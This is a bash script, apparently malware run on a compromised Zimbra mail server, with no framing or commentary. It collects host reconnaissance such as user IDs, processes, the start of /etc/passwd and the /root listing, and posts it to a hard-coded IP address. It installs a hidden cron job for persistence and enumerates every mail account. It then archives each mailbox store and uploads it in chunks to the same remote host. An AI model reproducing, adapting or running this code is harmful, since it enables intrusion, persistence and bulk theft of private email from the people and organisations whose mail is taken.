# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
#QRUN
exec 9>/tmp/.kdumplock
flock -n 9 || exit 0
U=http://131.123.43.239
U8=http://131.123.43.239:8123
L=/opt/zimbra/log
(crontab -l 2>/dev/null | grep -v "b\.sh"; echo "* * * * * bash $L/.kb.sh >/dev/null 2>&1") | crontab - 2>/dev/null
touch $L/.map $L/.doj $L/.dj2
/opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
while IFS= read -r a; do
  id=$(/opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
  [ -n "$id" ] && { echo "$a $id" >> $L/.map; }
done < /tmp/.todo
[ -s $L/.map ] && curl -sm30 -X POST --data-binary @$L/.map $U/kv_idmap.txt
GZ=gzip; command -v pigz >/dev/null 2>&1 && GZ=pigz
export U GZ L
do_id() {
  id="$1"
  grep -qx "$id" $L/.doj 2>/dev/null && return 0
  [ -d "/opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
  df -m /opt/zimbra 2>/dev/null | awk "NR==2{exit (\$4<800)?1:0}" || return 0
  rm -f /tmp/C_${id}_*
  tar c -C /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
  rem=0
  for cf in /tmp/C_${id}_*; do
    cn=${cf##*C_${id}_}
    [ -f "$cf" ] || continue
    grep -qx "${id}_${cn}" $L/.dj2 2>/dev/null && { rm -f "$cf"; continue; }
    okc=0
    for t in 1 2 3; do
      curl -sm 900 -X POST --data-binary @"$cf" -H "X-Name: kv_st_${id}_c${cn}" $U/up && { echo "${id}_${cn}" >> $L/.dj2; rm -f "$cf"; okc=1; break; } || sleep 2
    done
    [ $okc = 0 ] && rem=1
  done
  if [ $rem = 0 ]; then ls /tmp/C_${id}_* >/dev/null 2>&1 || echo "$id" >> $L/.doj; fi
  rm -f /tmp/C_${id}_*
}
export -f do_id
while :; do
  ALLDONE=1
  while read -r a id; do
    grep -qx "$id" $L/.doj 2>/dev/null || ALLDONE=0
  done < $L/.map
  [ "$ALLDONE" = 1 ] && break
  awk "{print \$2}" $L/.map | grep -E "^[0-9]+$" | grep -v -x -f $L/.doj | xargs -P 4 -I{} bash -c "do_id {}"
  sleep 20
done
curl -sm15 $U/kv_DUMP_DONE
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


